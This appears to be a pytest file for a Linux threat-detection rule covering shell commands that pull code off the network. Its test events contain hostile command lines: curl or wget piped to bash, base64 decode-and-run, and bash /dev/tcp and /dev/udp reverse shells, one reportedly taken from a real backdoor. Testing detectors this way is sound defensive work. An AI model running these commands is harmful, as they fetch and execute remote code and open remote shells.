"""
test_t1059_shell_network_tool.py — the live (non-sample) T1059.004 rule:
normalized-command matching and the additional risk indicators added in the
detection-hardening pass.
"""
import pytest
from app.detection.engine.yaml_detection_engine import YAMLDetectionEngine

RULE_ID = "linux_t1059_shell_network_tool"


@pytest.fixture
def engine():
    return YAMLDetectionEngine()


def _shell_event(command_line, name="bash", parent="sshd"):
    return {
        "process": {
            "name": name,
            "command_line": command_line,
            "parent": {"name": parent},
        },
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    }


def _t1059(engine, event):
    candidates = engine.evaluate_event(event, return_unmatched=True)
    return next((c for c in candidates if c.rule_id == RULE_ID), None)


def test_matches_curl_pipe_bash():
    c = _t1059(YAMLDetectionEngine(), _shell_event("curl http://x/s.sh | bash"))
    assert c is not None and c.matched is True and c.suppressed is False


def test_matches_despite_extra_whitespace():
    # Whitespace-padded command would dodge naive "| bash" matching on the raw
    # string; normalized_command collapses it so the rule still fires.
    c = _t1059(YAMLDetectionEngine(), _shell_event("curl   http://x/s.sh    |    bash"))
    assert c is not None and c.matched is True


def test_chmod_plus_x_adds_score(engine):
    base = _t1059(engine, _shell_event("wget http://x/p | bash"))
    withchmod = _t1059(engine, _shell_event("wget http://x/p -O /root/p; chmod +x /root/p | bash"))
    assert withchmod.risk_score > base.risk_score
    assert any("drop-and-run" in r for r in withchmod.adjustment_reasons)


def test_base64_decode_staging_reason(engine):
    c = _t1059(engine, _shell_event("curl http://x | base64 -d | bash"))
    assert c is not None and c.matched is True
    assert any("decode-and-run" in r for r in c.adjustment_reasons)


def test_var_tmp_execution_reason(engine):
    c = _t1059(engine, _shell_event("curl http://x -o /var/tmp/p | bash"))
    assert any("world-writable temp" in r for r in c.adjustment_reasons)


def test_no_match_without_pipe_to_shell(engine):
    # curl present but no pipe-to-shell / -c indicator -> rule must not match.
    c = _t1059(engine, _shell_event("curl http://x -o /root/file"))
    assert c is None or c.matched is False


def test_command_stored_in_args_via_normalized(engine):
    # Even if the raw command carries mixed case + padding, matching is
    # case-insensitive and whitespace-robust.
    c = _t1059(engine, _shell_event("CURL http://x/s.sh  |  BASH"))
    assert c is not None and c.matched is True


# ---------------------------------------------------------------------------
# /dev/tcp and /dev/udp bash/zsh built-in reverse shells
# ---------------------------------------------------------------------------

def test_matches_dev_tcp_reverse_shell_real_attack_command(engine):
    """Exact command captured live on a real host: threatactor-backdoor.service's
    ExecStart running a bash-native /dev/tcp reverse shell — previously
    invisible because no external tool binary (curl/wget/nc/...) is invoked."""
    c = _t1059(engine, _shell_event(
        '/bin/bash -c bash -i >& /dev/tcp/192.168.88.157/4444 0>&1'
    ))
    assert c is not None, "Expected a candidate for the /dev/tcp reverse shell"
    assert c.matched is True
    assert c.suppressed is False


def test_dev_tcp_adds_high_confidence_reason_and_score(engine):
    baseline = _t1059(engine, _shell_event("curl http://x/s.sh | bash"))
    devtcp = _t1059(engine, _shell_event(
        'bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
    ))
    assert devtcp.risk_score > baseline.risk_score
    assert any("high-confidence reverse-shell indicator" in r for r in devtcp.adjustment_reasons)


def test_matches_dev_udp_reverse_shell():
    c = _t1059(YAMLDetectionEngine(), _shell_event(
        'sh -c sh -i >& /dev/udp/10.0.0.1/53 0>&1', name="sh"
    ))
    assert c is not None and c.matched is True


def test_no_match_dev_tcp_without_shell_spawn_indicator(engine):
    """A bare mention of /dev/tcp with no pipe-to-shell / -c wrapper must not
    match — the technique still requires the same shell-spawn condition as
    curl/wget, e.g. a benign inline redirect a script might use for a port
    reachability check without invoking a nested shell."""
    c = _t1059(engine, _shell_event('exec 3<>/dev/tcp/10.0.0.1/80'))
    assert c is None or c.matched is False


def test_curl_pipe_bash_still_matches_after_dev_tcp_addition():
    """Regression guard: adding /dev/tcp/udp to the network-tool list must not
    disturb the original curl/wget/nc matching path."""
    c = _t1059(YAMLDetectionEngine(), _shell_event("wget http://x/p | sh", name="sh"))
    assert c is not None and c.matched is True


# ---------------------------------------------------------------------------
# Regression: real auditd-sourced events never carry user.name
# ---------------------------------------------------------------------------

def test_matches_real_auditd_event_with_no_user_name(engine):
    """AuditdParser never populates user.name from auid — only user.id — and
    the Go agent never sends a top-level `username` field, so genuine
    auditd-sourced events NEVER have user.name. This rule listed user.name in
    required_fields since it was written, but the field was silently
    unenforced until the required-fields skip gate landed on 2026-05-04
    (yaml_detection_engine.py). From that point on this rule silently
    stopped matching any real production event — it only ever "passed" in
    fixtures and hand-built debug scripts that supplied user.name manually.
    This event shape mirrors the real prod2 EXECVE record (process + host
    only, no user key at all) that reproduced the live miss."""
    event = {
        "process": {
            "name": "bash",
            "command_line": "/bin/bash -c bash -i >& /dev/tcp/192.168.88.157/4444 0>&1",
            "parent": {"pid": 1},
        },
        "host": {"name": "prod2"},
    }
    candidates = engine.evaluate_event(event, return_unmatched=True)
    c = next((x for x in candidates if x.rule_id == RULE_ID), None)
    assert c is not None, "Expected a candidate even without user.name present"
    assert c.matched is True
    assert "user.name" not in (c.missing_fields or [])
